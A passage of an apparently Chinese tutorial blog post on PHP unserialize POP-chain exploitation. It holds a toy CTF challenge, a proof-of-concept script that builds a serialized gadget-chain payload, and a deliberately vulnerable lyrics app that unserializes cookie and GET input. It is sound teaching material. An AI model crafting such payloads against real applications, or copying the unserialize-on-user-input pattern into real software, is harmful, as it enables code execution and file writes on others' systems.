class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line">$a = $_GET[<span class="hljs-string">&apos;string&apos;</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4ECE;&#x524D;&#x5F80;&#x540E;&#x8DDF; or &#x4ECE;&#x540E;&#x5F80;&#x524D;&#x8DDF;&#xFF1F;</p>
<p>POC</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $mod1;</span><br><span class="line">    <span class="hljs-keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> Call();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1(); <span class="hljs-comment"># &#x5165;&#x53E3;&#x70B9;&#xFF0C;mod1&#x53EF;&#x901A;&#x8FC7;&#x9644;&#x503C;&#x8D77;&#x8DF3;&#x3002;</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $mod1; <span class="hljs-comment"># &#x5B9E;&#x4F8B;&#x5316;funct</span></span><br><span class="line">    <span class="hljs-keyword">public</span> $mod2; <span class="hljs-comment"># &#x65E0;&#x5B83;&#x4EC0;&#x4E48;&#x4E8B;</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># &#x7EE7;&#x7EED;&#x8D77;&#x8DF3;&#xFF0C;&#x77BB;&#x524D;&#x987E;&#x540E;&#xFF0C;&#x601D;&#x8003;&#x4E0B;&#x9762;&#x7684; $this-&gt;mod1-&gt;test2();&#x4F1A;&#x5728;&#x4F55;&#x5904;&#x88AB;&#x4EC0;&#x4E48;&#x5229;&#x7528;</span></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> funct();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2(); <span class="hljs-comment"># &#x8FD9;&#x91CC;&#x8C03; __call</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $mod1; <span class="hljs-comment"># &#x5B9E;&#x4F8B;&#x5316;func</span></span><br><span class="line">    <span class="hljs-keyword">public</span> $mod2; <span class="hljs-comment"># &#x65E0;&#x5B83;&#x4EC0;&#x4E48;&#x4E8B;</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> func();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">($test2, $arr)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        $s1 = <span class="hljs-keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1(); <span class="hljs-comment"># &#x8FD9;&#x91CC;&#x89E6;&#x53D1; __invoke</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $mod1; <span class="hljs-comment"># &#x5B9E;&#x4F8B;&#x5316;string1</span></span><br><span class="line">    <span class="hljs-keyword">public</span> $mod2; <span class="hljs-comment"># __invoke&#x5BF9;&#x5176;&#x9644;&#x503C;&#xFF0C;&#x5176;&#x5B9E;&#x662F;&#x4E3A;&#x4E86;&#x8C03; __toString</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> string1();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;&#x5B57;&#x7B26;&#x4E32;&#x62FC;&#x63A5;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;mod1; <span class="hljs-comment"># &#x8FD9;&#x91CC;&#x82E5;&#x62FC;&#x63A5;&#x5219;&#x4F1A;&#x89E6;&#x53D1; __toString</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $str1; <span class="hljs-comment"># &#x5B9E;&#x4F8B;&#x5316; GetFlag</span></span><br><span class="line">    <span class="hljs-keyword">public</span> $str2;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;str1 = <span class="hljs-keyword">new</span> GetFlag();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag(); <span class="hljs-comment">#&#x8C03;&#x7528;&#x6B64;&#x5904;&#x5373;&#x53EF;getflag&#xFF0C;&#x96BE;&#x70B9;&#xFF1A;&#x9700;&#x8C03;&#x7528; __toString</span></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span> . <span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">$payload = <span class="hljs-keyword">new</span> start_gg();</span><br><span class="line"><span class="hljs-keyword">echo</span> urlencode(serialize($payload));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h3><p>demo&#x5F15;&#x7528;&#x81EA; @l3mon&#x5E08;&#x5085; <a href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html" target="_blank" rel="noopener">blog</a> &#x91CC;&#x7684;&#x4EE3;&#x7801;&#xFF1A;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OutputFilter</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $matchPattern;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $replacement;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($pattern, $repl)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;matchPattern = $pattern;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;replacement = $repl;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($data)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-keyword">$this</span>-&gt;matchPattern, <span class="hljs-keyword">$this</span>-&gt;replacement, $data);</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogFileFormat</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $filters;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $endl;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filters, $endl)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;filters = $filters;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;endl = $endl;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span><span class="hljs-params">($txt)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;filters <span class="hljs-keyword">as</span> $filter) {</span><br><span class="line">      $txt = $filter-&gt;filter($txt);</span><br><span class="line">    }</span><br><span class="line">    $txt = str_replace(<span class="hljs-string">&apos;\n&apos;</span>, <span class="hljs-keyword">$this</span>-&gt;endl, $txt);</span><br><span class="line">    <span class="hljs-keyword">return</span> $txt;</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogWriter_File</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $filename;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $format;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename, $format)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;filename = str_replace(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;__&quot;</span>, str_replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, $filename));</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;format = $format;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeLog</span><span class="hljs-params">($txt)</span> </span>{</span><br><span class="line">    $txt = <span class="hljs-keyword">$this</span>-&gt;format-&gt;format($txt);</span><br><span class="line">    <span class="hljs-comment">//<span class="hljs-doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span><br><span class="line">    file_put_contents(<span class="hljs-string">&quot;C:\\WWW\\test\\ctf\\kon\\&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;filename, $txt, FILE_APPEND);</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $logwriter;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($writer)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logwriter = $writer;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span><span class="hljs-params">($txt)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logwriter-&gt;writeLog($txt);</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Song</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $logger;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $name;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $group;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $url;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, $group, $url)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;group = $group;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;url = $url;</span><br><span class="line">    $fltr = <span class="hljs-keyword">new</span> OutputFilter(<span class="hljs-string">&quot;/\[i\](.*)\[\/i\]/i&quot;</span>, <span class="hljs-string">&quot;&lt;i&gt;\\1&lt;/i&gt;&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logger = <span class="hljs-keyword">new</span> Logger(<span class="hljs-keyword">new</span> LogWriter_File(<span class="hljs-string">&quot;song_views&quot;</span>, <span class="hljs-keyword">new</span> LogFileFormat(<span class="hljs-keyword">array</span>($fltr), <span class="hljs-string">&quot;\n&quot;</span>)));</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;a href=&apos;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;url . <span class="hljs-string">&quot;&apos;&gt;&lt;i&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&quot;&lt;/i&gt;&lt;/a&gt; by &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;group;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;logger-&gt;log(<span class="hljs-string">&quot;Song &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&quot; by [i]&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;group . <span class="hljs-string">&quot;[/i] viewed.\n&quot;</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_name</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;name;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lyrics</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $lyrics;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $song;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($lyrics, $song)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;song = $song;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;lyrics = $lyrics;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;song-&gt;__toString() . <span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;&quot;</span> . str_replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;lyrics) . <span class="hljs-string">&quot;&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;song-&gt;log();</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shortForm</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;a href=&apos;song.php?name=&quot;</span> . urlencode(<span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name()) . <span class="hljs-string">&quot;&apos;&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name() . <span class="hljs-string">&quot;&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name_is</span><span class="hljs-params">($name)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name() === $name;</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addLyrics</span><span class="hljs-params">($lyrics)</span> </span>{</span><br><span class="line">    $oldlyrics = <span class="hljs-keyword">array</span>();</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>])) {</span><br><span class="line">      $oldlyrics = unserialize(base64_decode($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>]));</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($lyrics <span class="hljs-keyword">as</span> $lyric) $oldlyrics []= $lyric;</span><br><span class="line">    setcookie(<span class="hljs-string">&apos;lyrics&apos;</span>, base64_encode(serialize($oldlyrics)));</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLyrics</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>])) {</span><br><span class="line">      <span class="hljs-keyword">return</span> unserialize(base64_decode($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>]));</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> {</span><br><span class="line">      setcookie(<span class="hljs-string">&apos;lyrics&apos;</span>, base64_encode(serialize(<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>))));</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Porter</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exportData</span><span class="hljs-params">($lyrics)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> base64_encode(serialize($lyrics));</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">importData</span><span class="hljs-params">($lyrics)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> serialize(base64_decode($lyrics));</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Conn</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $conn;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($dbuser, $dbpass, $db)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;conn = mysqli_connect(<span class="hljs-string">&quot;localhost&quot;</span>, $dbuser, $dbpass, $db);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLyrics</span><span class="hljs-params">($lyrics)</span> </span>{</span><br><span class="line">    $r = <span class="hljs-keyword">array</span>();</span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($lyrics <span class="hljs-keyword">as</span> $lyric) {</span><br><span class="line">      $s = intval($lyric);</span><br><span class="line">      $result = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;SELECT data FROM lyrics WHERE id=$s&quot;</span>);</span><br><span class="line">      <span class="hljs-keyword">while</span> (($row = $result-&gt;fetch_row()) != <span class="hljs-keyword">NULL</span>) {</span><br><span class="line">        $r []= unserialize(base64_decode($row[<span class="hljs-number">0</span>]));</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> $r;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addLyrics</span><span class="hljs-params">($lyrics)</span> </span>{</span><br><span class="line">    $ids = <span class="hljs-keyword">array</span>();</span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($lyrics <span class="hljs-keyword">as</span> $lyric) {</span><br><span class="line">      <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;INSERT INTO lyrics (data) VALUES (\&quot;&quot;</span> . base64_encode(serialize($lyric)) . <span class="hljs-string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">      $res = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;SELECT MAX(id) FROM lyrics&quot;</span>);</span><br><span class="line">      $id= $res-&gt;fetch_row(); $ids[]= intval($id[<span class="hljs-number">0</span>]);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">echo</span> var_dump($ids);</span><br><span class="line">    <span class="hljs-keyword">return</span> $ids; </span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;conn-&gt;close();</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;conn = <span class="hljs-keyword">NULL</span>;</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line">unserialize($_GET[<span class="hljs-string">&apos;cmd&apos;</span>]);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x51FD;&#x6570; + &#x53EF;&#x63A7;&#x53C2;&#x6570; == &#x63A7;&#x5236;&#x5F53;&#x524D;&#x4F5C;&#x7528;&#x57DF;&#x4E0B;&#x5BF9;&#x8C61;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addLyrics</span><span class="hljs-params">($lyrics)</span> </span>{</span><br><span class="line">    $oldlyrics = <span class="hljs-keyword">array</span>();</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>])) {</span><br><span class="line">      $oldlyrics = unserialize(base64_decode($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>]));</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($lyrics <span class="hljs-keyword">as</span> $lyric) $oldlyrics []= $lyric;</span><br><span class="line">    setcookie(<span class="hljs-string">&apos;lyrics&apos;</span>, base64_encode(serialize($oldlyrics)));</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLyrics</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>])) {</span><br><span class="line">      <span class="hljs-keyword">return</span> unserialize(base64_decode($_COOKIE[<span class="hljs-string">&apos;lyrics&apos;</span>]));</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> {</span><br><span class="line">      setcookie(<span class="hljs-string">&apos;lyrics&apos;</span>, base64_encode(serialize(<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>))));</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x81EA;&#x5B9A;&#x4E49; $song &#x503C; + __destruct == &#x8C03;&#x7528;&#x5F53;&#x524D;&#x4F5C;&#x7528;&#x57DF;&#x4E0B; log&#x65B9;&#x6CD5;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lyrics</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">protected</span> $lyrics;</span><br><span class="line">  <span class="hljs-keyword">protected</span> $song;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($lyrics, $song)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;song = $song;</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;lyrics = $lyrics;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;song-&gt;__toString() . <span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;&quot;</span> . str_replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;lyrics) . <span class="hljs-string">&quot;&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;song-&gt;log();</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shortForm</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;a href=&apos;song.php?name=&quot;</span> . urlencode(<span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name()) . <span 